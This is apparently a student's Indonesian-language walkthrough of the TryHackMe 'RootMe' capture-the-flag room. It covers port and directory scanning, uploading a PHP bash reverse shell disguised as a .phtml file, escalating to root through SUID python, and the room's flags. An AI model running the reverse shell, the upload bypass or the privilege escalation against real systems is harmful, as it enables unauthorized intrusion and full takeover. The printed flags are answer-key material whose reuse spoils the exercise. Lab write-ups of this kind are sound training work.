
# Rootme
 ### TASK 1: 
#### 1. Scan the machine, how many ports are open?
Ans: Untuk mengetahui nya dapat  menggunakan nmap dengan command:
```bash
nmap -sS -Pn 10.48.177.44
```
setelah dijalankan maka akan tampak jumlah port yang terbuka yaitu **2** port

#### 2. What version of Apache is running?
Ans: versi apache yang sedang berjalan dapat diketahui melakukan inspect. pertama tama pad web yang berjalan tekan **cntrl + shift + i** lalu memilih pad bagian network. Setelah itu refresh halaman dan lihat pada url utama lalu lihat informasi di respon header, akan nampak versi nya yaitu **    Apache/2.4.41** 

#### 4.  What service is running on port 22?
Ans: untuk menjawabnya dapat dilihat dari scan awal awal menggunakan nmap dan dari scan tersebut dapat diketahui port 22 digunakan oleh **ssh**.

#### 5. Find directories on the web server using the GoBuster tool.
Menjalankan gobuster dengan menjalankan syntax
```bash
gobuster dir -u http://10.48.177.44 -w /usr/share/wordlists/dirb/common.txt
```
#### 6. What is the hidden directory?
Ans: untuk mengetahui nya dapat dilihat dari hasil gobuster sebelumya dan melihat satu persatu dan dapat diketahui ada directory bernama **panel**

#                            #

### Task 3: 

#### Find a form to upload and get a reverse shell, and find the flag.
Ans: pertama tama perlu menggunakan reverse shell atau membuat agar target yang melakukan koneksi ke computer kita. dengan menggunakan kode php berikut:
```bash
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/<ip-komputer-kita>/<port-yang-digunakan> 0>&1'");
?>
```
Kode tersebut memerlukan ip address yang didapat dari sambungan vpn dan port yang kosong. 

Kita perlu  memasukkan kode php tersebut ke dalam file dengan tipe .phtml (seperti MM.phtml) karena upload file dalam bentuk php tidak diterima oleh client.  

Kita juga perlu menyiapkan tempat untuk koneksi dari target terhubung dengan menggunakan command :

``` bash
nc -lvnp <port-yang-ingin-digunakan> 
```


Setelah lingkungan untuk terhubung nya target dan file untuk reverse shell sudah siap maka perlu untuk meng-upload file tersebut ke halaman http://<ip mesin>/panel/ . Lalu Mengklik tulisan Veja!!! agar file tersebut terbuka. 

Setelah langkah diatas maka sudah ada jaringan yang terhubung dengan computer kita. 

Setelah terhubung untuk menyelesaikan tugas ini perlu mencari file user.txt. oleh karena itu untuk pencarian menggunakan command:

```bash
find  / -type f -name "user.txt" 2>/dev/null
```

Setelah didapat lokasi file nya yaitu /var/www/user.txt langkah terakhir adalah menampilkan nya dengan 


```bash
cat /var/www/user.txt
```
dan didapatkan flag nya yaitu **THM{y0u_g0t_a_sh3ll}**

#  #

### TASK 4
 
#### 1. Search for files with SUID permission, which file is weird?
Ans: Untuk mengetahui nya pertama tama perlu mengetahui file yang memiliki SUID permission dengan menggunakan command:

```bash
    find / -user root -perm /4000
```
dengan menggunakan command diatas maka dapat diketahui file yang memiliki SUID permission. Lalu kita melihat file yang ada.
Dan ditemukan file itu adalah **file /usr/bin/python**  karena dengan file ini maka sebuah user biasa akan bisa naik menjadi root karena python yang powerful lewat modul OS. jika python memiliki fitur root maka modul ini dapat digunakan dengan sangat leluasa oleh penyerang.
  
####  2. Find a form to escalate your privileges.
Ans: Untuk masuk ke mode super user dapat menggunakan gtfobins untuk masuk ke metode super user. tipe gtfobins yang digunakan disesuaikan edngan file yang memiliki SUID permission yaitu file python. artinya dengan menjalankan program python kita bisa masuk ke mode super user. kita dapat masuk dengan menggunakan command:
```bas
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
setelah dijalankan maka akan masuk ke mode super user.

#### root.txt
ans: untuk membukanya pertama masuk ke folder dari root.txt yaitu root dengan command 
```bash
cd /root/
```
setelah itu tinggal menampilkan isi dari file tersebut dengan:
```bash
cat /root.txt
```
setelah itu maka akan keluar flag nya yaitu THM **{pr1v1l3g3_3sc4l4t10n}**




